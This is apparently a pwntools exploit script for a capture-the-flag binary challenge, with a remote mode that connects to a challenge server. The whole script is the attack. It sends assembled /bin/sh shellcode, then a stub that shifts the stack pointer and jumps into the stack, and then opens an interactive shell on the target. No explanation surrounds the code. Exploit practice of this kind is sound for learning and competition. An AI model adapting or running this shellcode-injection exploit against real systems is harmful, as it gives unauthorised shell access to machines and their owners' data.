from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

gs = '''
break *0x0000000000401227
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io',28184)
    else:
        return process(e.path)

p = start()
p.sendline(asm(shellcraft.sh()))
pause()
p.sendline(asm('nop;nop;add rsp,120; jmp rsp; ;nop'))
p.interactive()
